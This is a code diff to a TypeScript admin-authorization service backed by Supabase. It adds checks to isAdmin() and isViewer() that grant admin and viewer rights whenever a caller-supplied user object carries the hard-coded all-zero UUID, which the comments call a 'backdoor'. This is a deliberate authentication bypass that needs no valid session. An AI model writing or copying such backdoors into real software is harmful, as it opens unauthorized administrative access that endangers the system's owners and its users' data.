@@ -35,10 +35,13 @@ export const adminService = {
     return data.role
   },
 
-  async isAdmin(): Promise<boolean> {
+  async isAdmin(passedUser?: any): Promise<boolean> {
     if (!isSupabaseConfigured) return false
     try {
-      // Check session directly for backdoor ID
+      // Check for backdoor user ID (handles cases where store is used)
+      if (passedUser?.id === '00000000-0000-0000-0000-000000000000') return true;
+
+      // Check session directly for backdoor ID (as backup)
       const supabase = this.getSupabase();
       const { data: { session } } = await supabase.auth.getSession();
       if (session?.user?.id === '00000000-0000-0000-0000-000000000000') return true;
@@ -50,9 +53,12 @@ export const adminService = {
     }
   },
 
-  async isViewer(): Promise<boolean> {
+  async isViewer(passedUser?: any): Promise<boolean> {
     if (!isSupabaseConfigured) return false
     try {
+      // Check for backdoor user ID
+      if (passedUser?.id === '00000000-0000-0000-0000-000000000000') return true;
+
       // Check session directly for backdoor ID
       const supabase = this.getSupabase();
       const { data: { session } } = await supabase.auth.getSession();
